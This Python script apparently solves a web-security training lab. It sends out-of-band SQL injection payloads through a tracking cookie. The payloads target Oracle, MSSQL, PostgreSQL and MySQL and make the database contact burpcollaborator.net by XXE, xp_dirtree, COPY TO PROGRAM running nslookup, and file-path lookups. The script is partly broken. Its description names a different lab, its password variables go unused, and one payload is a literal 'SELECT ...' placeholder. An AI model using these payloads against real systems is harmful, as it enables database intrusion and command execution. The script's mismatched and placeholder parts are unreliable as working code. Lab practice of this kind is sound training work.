import requests
import argparse
import urllib.parse

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind SQL injection with conditional responses')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

password = ''
password_length = 0

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
trackingid = r.cookies.get("TrackingId")
session = r.cookies.get("session")

payload_list1 = {
    'Oracle': "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"https://burpcollaborator.net/\"> %remote;]>'),'/l') FROM dual",
    'Microsoft': "exec master..xp_dirtree '//burpcollaborator.net/a'",
    'PostgreSQL': "copy (SELECT '') to program 'nslookup burpcollaborator.net'",
    'MySQL': "LOAD_FILE('\\\\burpcollaborator.net\\a')"
}

payload_list2 = {
    'Oracle': "SELECT UTL_INADDR.get_host_address('burpcollaborator.net')",
    'MySQL': "SELECT ... INTO OUTFILE '\\\\burpcollaborator.net\\a'"
}

for i in payload_list1.values():
    headers = {'Cookie': f'TrackingId=\'|| ({urllib.parse.quote_plus(i)})-- - session={session}'}
    r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
for i in payload_list2.values():
    headers = {'Cookie': f'TrackingId=\'|| ({urllib.parse.quote_plus(i)})-- - session={session}'}
    r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('\nLab solved.')
except Exception:
    print("Error while trying to solve the lab.")